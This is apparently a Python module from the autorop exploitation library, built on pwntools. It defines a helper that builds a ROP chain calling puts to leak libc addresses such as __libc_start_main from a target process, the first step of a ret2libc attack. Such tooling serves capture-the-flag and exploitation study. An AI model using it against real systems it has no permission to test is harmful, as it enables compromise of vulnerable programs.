from autorop import PwnState, arutil, constants
from pwn import ROP
from typing import Iterable


def puts(
    short: bool = False, leak_symbols: Iterable[str] = ["__libc_start_main", "puts"]
) -> constants.TYPE_PIPE:
    """Leak libc addresses using ``puts``.

    This returns a function which opens a new target, and leaks
    the addresses of (by default) ``__libc_start_main`` and ``puts`` using ``puts``,
    placing them in ``state.leaks``.

    Arguments:
        short: Whether the attack should be minimised i.e. leak only one address.
        leak_symbols: What symbols should be leaked.

    Returns:
        Function which takes the state, and returns the mutated ``PwnState``,
        with the following updated

            - ``target``: The fresh instance of target from which we got a successful leak.
              Hopefully it can still be interacted with.
            - ``leaks``: Updated with ``"symbol": address`` pairs for each
              address that was leaked.
    """
    if short:
        leak_symbols = [next(iter(leak_symbols))]

    def puts_instance(state: PwnState) -> PwnState:
        def leaker(rop: ROP, address: int) -> ROP:
            arutil.align_call(rop, "puts", [address])
            return rop

        return arutil.leak_helper(state, leaker, leak_symbols)

    return puts_instance
